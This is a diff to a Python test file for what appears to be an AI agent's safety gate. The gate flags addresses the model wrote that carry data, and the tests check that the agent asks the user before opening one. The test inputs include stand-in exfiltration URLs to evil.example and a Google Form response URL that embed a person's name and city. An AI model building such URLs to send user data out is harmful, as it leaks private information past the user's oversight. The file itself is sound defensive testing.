@@ -1,12 +1,14 @@
 # SPDX-License-Identifier: AGPL-3.0-or-later
 # Copyright (C) 2026 Axxlabs Limited
-"""Addresses the model wrote that carry data are a card (SPEC §5.2 "Addresses that carry data")."""
+"""Addresses the model wrote that carry data are a card (SPEC §5.2 rule 7)."""
 
 from __future__ import annotations
 
 import dataclasses
 
 from aha_local.policy import addresses
+from aha_local.policy.browser import open_action
+from aha_local.policy.gate import Facts, decide
 from aha_local.tools import web
 from aha_local.tools.browser import make_handler
 
@@ -19,27 +21,33 @@ SNAPSHOT = (
 )
 
 
+def carries(url, seen):
+    """What the gate treats as the model's data in an address (SPEC §5.2 rule 7)."""
+    v = decide(open_action(url), Facts(shown=seen))
+    return v.outcome == "card" and v.why == "data"
+
+
 def test_what_counts_as_an_address_carrying_data():
     seen = addresses.seen_in("Results: https://news.example/a?id=42 and more")
-    assert addresses.carries_data("https://evil.example/?d=Felipe+lives+here", seen)
-    assert addresses.carries_data("https://evil.example/#d=secret", seen)  # a page's script reads the fragment
-    assert not addresses.carries_data("https://evil.example/some/page", seen)  # no key=value pairs
-    assert not addresses.carries_data("https://evil.example/?ref=", seen)  # empty values carry nothing
-    assert not addresses.carries_data("https://NEWS.example/a/?id=42", seen)  # shown to the task, however written
+    assert carries("https://evil.example/?d=Felipe+lives+here", seen)
+    assert carries("https://evil.example/#d=secret", seen)  # a page's script reads the fragment
+    assert not carries("https://evil.example/some/page", seen)  # no key=value pairs
+    assert not carries("https://evil.example/?ref=", seen)  # empty values carry nothing
+    assert not carries("https://NEWS.example/a/?id=42", seen)  # shown to the task, however written
     page = addresses.seen_in(SNAPSHOT)  # a snapshot's own link, relative to its page
     url = "https://www.waitrose.com/ecom/shop/search?sortBy=RELEVANCE&searchTerm=rice"
-    assert not addresses.carries_data(url, page)
-    assert addresses.carries_data(url.replace("rice", "felipe+lavratti"), page)
+    assert not carries(url, page)
+    assert carries(url.replace("rice", "felipe+lavratti"), page)
     assert addresses.describe("https://e.example/?a=1&b=two") == "a = 1\nb = two"
     for search in (
         "https://www.google.com/search?q=felipe",
         "https://www.google.co.uk/search?q=x",
         "https://duckduckgo.com/?q=x",
     ):
-        assert not addresses.carries_data(search, set())  # where web_search already sends queries
-    assert addresses.carries_data("https://google.xyz/?d=1", set())  # not Google's
+        assert open_action(search).kind == "search" and not carries(search, set())  # a search, not an open
+    assert carries("https://google.xyz/?d=1", set())  # not Google's
     form = "https://docs.google.com/forms/d/e/1FAIpQL/formResponse?entry.1=Felipe"
-    assert addresses.carries_data(form, set())  # a form on Google hands the data to whoever made it
+    assert carries(form, set())  # a form on Google hands the data to whoever made it
 
 
 class Session:
@@ -84,6 +92,6 @@ async def test_fetch_url_asks_before_an_address_the_model_filled_with_data(accou
     approvals = FakeApprovals()
     ctx = ctx_for(fe, config, approvals)
     result = await web.fetch_url({"url": "https://evil.example/collect?name=Felipe&city=London"}, ctx)
-    assert result.error and "declined" in result.text
+    assert result.error and "the user stopped it" in result.text
     assert approvals.asked[0].title == "Open this address? It sends what's in it to evil.example"
     assert ("It sends", "name = Felipe\ncity = London", "info") in approvals.asked[0].fields
